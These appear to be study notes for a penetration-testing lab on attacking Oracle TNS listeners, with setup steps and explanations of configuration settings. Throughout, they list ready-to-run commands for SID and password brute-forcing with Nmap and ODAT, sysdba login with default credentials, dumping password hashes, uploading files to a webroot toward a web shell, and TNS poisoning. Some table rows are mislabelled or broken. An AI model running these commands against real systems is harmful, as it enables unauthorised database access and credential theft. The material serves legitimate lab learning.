-Important ports: Default listens on 1521 (but can be changed)

# Oracle TNS

- Oracle Transparent Network Substrate (TNS) 
- Supports various networking protocols betwene Oracle databases and client applications, eg. IPX/SPX and TCP/IP protocol stacks
	- Used to manages large complex databases
	- Built in encryption
- Is a bit like DNS + connection negotiation for Oracle.
	- Client asks for ORCL, TNS figures out the 'address' and 'service' to reach it, then establishes the session.

# Odat
- Oracle Database Attacking Tool 
	- `./odat.py -h` to check if installed

# SIDs
- In Oracle Relational Database Management Systems (RDBMS), SID is a unique name that identifies particular database **instance**
	- Instance: set of processes and memory structures that interact to manage database's data
- When client connects to Oracle database, specifies database's SID, with connection string
	- If no SID specified, default value in `tnsnames.ora` used
- SID bruteforcing
	- `nmap p1521 -sV 10.129.204.235 --open --script oracle-sid-brute`
	- `./odat.py all -s 10.129.204.235`
		- odat scans may retrieve database names, versions, running processes, user accounts, vulnerabilities, misconfiguraitons, etc.
		- may find valid credentials -> can log in

# Logging in
- sqlplus
	- `sqlplus scott/tiger@10.129.204.235/[SID]`
	- if get error: sqlplus: error while loading shared libraries: libsqlplus.so
		- `sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig`
	- can try logging in as System Database Admin
		- `sqlplus scott/tiger@10.129.204.235/[SID] as sysdba`
	- extract password hashes
		- `select name, password from sys.user$;`
	- Uploading web shell to target
		- requires server to run a web server, and need to know exact location of root directory of webserver
			- can try default paths
				- Linux: /var/www/html
				- Windows: C:\inetpub\wwwroot
	- File upload
		- `echo "Oracle File Upload Test" > testing.txt`
		- `./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
		- Can test if file upload approach worked with curl
			- `curl -X GET http://10.129.204.235/testing.txt`


| Protocol / Tool                                     | Command / Syntax                                                                                                                                                                                                                                                                | Purpose / Notes                                                                                                                                                                                                       |
| --------------------------------------------------- | :------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Port scan + basic TNS info (Nmap)**               | `nmap -sV -p 1521 --script=oracle-tns-version <target>`                                                                                                                                                                                                                         | Probe listener and attempt to fingerprint the TNS listener/version. Use `-sV` to get service version.                                                                                                                 |
| **Brute-force SIDs (Nmap NSE)**                     | `nmap -p 1521 --script oracle-sid-brute --script-args oraclesids=/path/to/oracle-sids <target>`                                                                                                                                                                                 | Guess Oracle instance/SID names against the TNS listener using a SID wordlist. (NSE script: `oracle-sid-brute`). ([Nmap][1])                                                                                          |
| **Brute-force Oracle credentials (Nmap NSE)**       | `nmap -p 1521 --script oracle-brute --script-args userdb=/path/users.txt,passdb=/path/passes.txt <target>`                                                                                                                                                                      | Remote username/password auditing against Oracle (uses supplied lists or defaults). Use `--script-args` to point to custom lists. ([Nmap][2])                                                                         |
| **Detect xp\_cmdshell / config via NSE**            | `nmap -p 1521 --script oracle-sid-brute,oracle-info <target>`                                                                                                                                                                                                                   | Combine scripts for discovery; replace `oracle-info` with other NSE scripts if present. (Use carefully to avoid DoS.)                                                                                                 |
| **TNS name reachability**                           | `tnsping <TNS_ALIAS>` or `tnsping <host>:1521`                                                                                                                                                                                                                                  | Test that a TNS alias/listener is reachable and resolves; quick way to check listener response. (Oracle client utility). ([Oracle Docs][3])                                                                           |
| **Listener control (server-side)**                  | `lsnrctl status` / `lsnrctl services` / \`lsnrctl start                                                                                                                                                                                                                         | stop                                                                                                                                                                                                                  |
| **ODAT — install / help**                           | `sudo apt install odat` then `odat -h` or `./odat.py -h`                                                                                                                                                                                                                        | ODAT (Oracle Database Attacking Tool). Shows subcommands (sidguesser, tnscmd, tnspoison, passwordguesser, privesc, etc.). Use ODAT for SID/service discovery, brute force and exploitation modules. ([Kali Linux][5]) |
| **ODAT all**                                        | `./odat.py all -s 10.129.204.235`                                                                                                                                                                                                                                               |                                                                                                                                                                                                                       |
| **ODAT — guess SIDs / Service Names**               | `./odat.py sidguesser -t <target> -p 1521` or `./odat.py snguesser -t <target> -p 1521`                                                                                                                                                                                         | Run ODAT’s SID/Service-Name guessing modules to find valid SIDs/services before attempting auth. (Has options for wordlists, sleep/delay to avoid ORA-12519). ([GitHub][6])                                           |
| **ODAT — brute credentials**                        | `./odat.py passwordguesser -t <target> -p 1521 -s <SID> -U users.txt -P passes.txt`                                                                                                                                                                                             | Try combos against a discovered SID/service. ODAT supports many modules for post-auth attacks (privesc, file read, scheduler, java, etc.). ([GitHub][6])                                                              |
| **ODAT — TNS commands (tnscmd)**                    | `./odat.py tnscmd -t <target> -p 1521 --tns-string "(DESCRIPTION=...)"`                                                                                                                                                                                                         | Send low-level TNS commands (get listener info, VSNNUM fingerprinting). Useful for recon. ([GitHub][6])                                                                                                               |
| **EZConnect (sqlplus) — quick connect**             | `sqlplus username/password@host:1521/SERVICE_NAME` or `sqlplus username/password@//host:1521/service_name`                                                                                                                                                                      | EZConnect string — connect without `tnsnames.ora`. Works for SERVICE\_NAME; SID can also be used in descriptors. ([Stack Overflow][7])                                                                                |
| **Full connect descriptor (sqlplus)**               | `sqlplus user/password@"(DESCRIPTION=(ADDRESS=(PROTOCOL=TCP)(HOST=host)(PORT=1521))(CONNECT_DATA=(SID=ORCL)))"`                                                                                                                                                                 | When EZConnect fails, use full TNS descriptor — necessary for complex connections. ([Database Administrators Stack Exchange][8])                                                                                      |
| **sqlplus (no login) / then connect**               | `sqlplus /nolog` → `SQL> CONNECT username/password@host:1521/SERVICE`                                                                                                                                                                                                           | Start client without connecting (useful when you need to change settings before auth). ([Oracle Docs][9])                                                                                                             |
| **Check current user**                              | `SELECT USER FROM DUAL;`                                                                                                                                                                                                                                                        | SQL query to see the currently connected DB user. Use inside `sqlplus`.                                                                                                                                               |
| **Show DB version / banner**                        | `SELECT * FROM v$version;`                                                                                                                                                                                                                                                      | Quickly fingerprint Oracle version and installed components.                                                                                                                                                          |
| **List pluggable/container / databases**            | `SELECT name,open_mode FROM v$pdbs;` (multitenant) or `SELECT * FROM global_name;`                                                                                                                                                                                              | Useful on 12c+ multi-tenant DBs to discover PDB names and states.                                                                                                                                                     |
| **List users & roles**                              | `SELECT username,account_status FROM dba_users;` (requires privilege) or `SELECT * FROM all_users;`                                                                                                                                                                             | Enumerate DB users (privileged view may require DBA).                                                                                                                                                                 |
| **Describe a table / object**                       | `DESC schema.table;` or `DESCRIBE table;`                                                                                                                                                                                                                                       | Show table columns and types (SQL\*Plus built-in `DESC`).                                                                                                                                                             |
| **Select top rows**                                 | `SELECT * FROM schema.table WHERE ROWNUM <= 10;`                                                                                                                                                                                                                                | MSSQL equivalent uses `TOP` — Oracle uses `ROWNUM` for quick sampling.                                                                                                                                                |
| **Spooling output to a file**                       | `SQL> SPOOL /tmp/output.txt` `SQL> ...queries...` `SQL> SPOOL OFF`                                                                                                                                                                                                              | Capture session output for later analysis. Very handy in labs.                                                                                                                                                        |
| **Formatting in SQL\*Plus**                         | `SET LINESIZE 200` `SET PAGESIZE 100` `COLUMN col_name FORMAT A50`                                                                                                                                                                                                              | Improve readability of wide results inside `sqlplus`.                                                                                                                                                                 |
| **Run a local SQL script**                          | `SQL> @/path/to/script.sql`                                                                                                                                                                                                                                                     | Execute a script file from SQL\*Plus.                                                                                                                                                                                 |
| **Check for OS command exec vectors**               | `SELECT * FROM v$option WHERE parameter='Java';` then test Java/DBMS\_SCHEDULER/UTL\_FILE modules cautiously                                                                                                                                                                    | Look for features that enable code execution (DBMS\_SCHEDULER, Java VM, external tables). Use only in authorised tests.                                                                                               |
| **Attempt SYSDBA connection (when you have creds)** | `sqlplus sys/password@host:1521/SERVICE AS SYSDBA`                                                                                                                                                                                                                              | Connect as SYSDBA (very high privilege). Use only with authorised credentials.                                                                                                                                        |
| **TNS poisoning (concept / ODAT tnspoison)**        | `./odat.py tnspoison -t <target> -s <SID> ...`                                                                                                                                                                                                                                  | ODAT includes tnspoison module to simulate client-side alias manipulation / poisoning—use only in lab environments. ([GitHub][6])                                                                                     |
| **Safe discovery workflow (suggested)**             | 1) `nmap -p1521 --script=oracle-tns-version <target>` → 2) `nmap --script oracle-sid-brute` → 3) `tnsping` / `lsnrctl services` (if server access) → 4) use ODAT `sidguesser`/`passwordguesser` → 5) `sqlplus` connect → enumerate (`v$version`, `all_users`, `dba_role_privs`) | Follow this ordered approach to minimise noisy attempts and ORA-12519 errors; add `--sleep`/rate control in ODAT to avoid overloading listener. ([GitHub][6])                                                         |
|                                                     |                                                                                                                                                                                                                                                                                 |                                                                                                                                                                                                                       |
# Default config
- Security features
	- Listener only accept connections from authorized hosts
	- Performs basic authentication using combination of hostnames, IP addresses, usernames, passwords
	- Oracle Net Services to encrypt communication between client and server
	- Config files: `tnsnames.ora, listener.ora`
		- `tnsnames.ora` - each database/service has unique entry in here.
			- client-side Oracle Net Services use this file to resolve service names to network addresses
		- `listener.ora` - server side  config that defines listener's properties and parameters
			- listener uses this to determine the services it should listen to, and behaviour of listener
	- In $ORACLE_HOME/network/admin directory
- Often used with other Oracle services like Oracle DBSNMP,...
	- Oracle DBSNMP **default password** -> **dbsnmp**
	- Many orgs still use the *finger* service with Oracle -> vulnerable

- Oracle databases can be protected by using PL/SQL Exclusion List, PlsqlExclusionlist.
	- User-created text file, inside $ORACLE_HOME/sqldeveloper directory

|**Setting**|**Description**|
|---|---|
|`DESCRIPTION`|A descriptor that provides a name for the database and its connection type.|
|`ADDRESS`|The network address of the database, which includes the hostname and port number.|
|`PROTOCOL`|The network protocol used for communication with the server|
|`PORT`|The port number used for communication with the server|
|`CONNECT_DATA`|Specifies the attributes of the connection, such as the service name or SID, protocol, and database instance identifier.|
|`INSTANCE_NAME`|The name of the database instance the client wants to connect.|
|`SERVICE_NAME`|The name of the service that the client wants to connect to.|
|`SERVER`|The type of server used for the database connection, such as dedicated or shared.|
|`USER`|The username used to authenticate with the database server.|
|`PASSWORD`|The password used to authenticate with the database server.|
|`SECURITY`|The type of security for the connection.|
|`VALIDATE_CERT`|Whether to validate the certificate using SSL/TLS.|
|`SSL_VERSION`|The version of SSL/TLS to use for the connection.|
|`CONNECT_TIMEOUT`|The time limit in seconds for the client to establish a connection to the database.|
|`RECEIVE_TIMEOUT`|The time limit in seconds for the client to receive a response from the database.|
|`SEND_TIMEOUT`|The time limit in seconds for the client to send a request to the database.|
|`SQLNET.EXPIRE_TIME`|The time limit in seconds for the client to detect a connection has failed.|
|`TRACE_LEVEL`|The level of tracing for the database connection.|
|`TRACE_DIRECTORY`|The directory where the trace files are stored.|
|`TRACE_FILE_NAME`|The name of the trace file.|
|`LOG_FILE`|The file where the log information is stored.|



Setup:
```c
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
wget https://download.oracle.com/otn_software/linux/instantclient/214000/instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
sudo mkdir -p /opt/oracle
sudo unzip -d /opt/oracle instantclient-basic-linux.x64-21.4.0.0.0dbru.zip
sudo unzip -d /opt/oracle instantclient-sqlplus-linux.x64-21.4.0.0.0dbru.zip
export LD_LIBRARY_PATH=/opt/oracle/instantclient_21_4:$LD_LIBRARY_PATH
export PATH=$LD_LIBRARY_PATH:$PATH
source ~/.bashrc
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
pip3 install cx_Oracle
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome

```

`
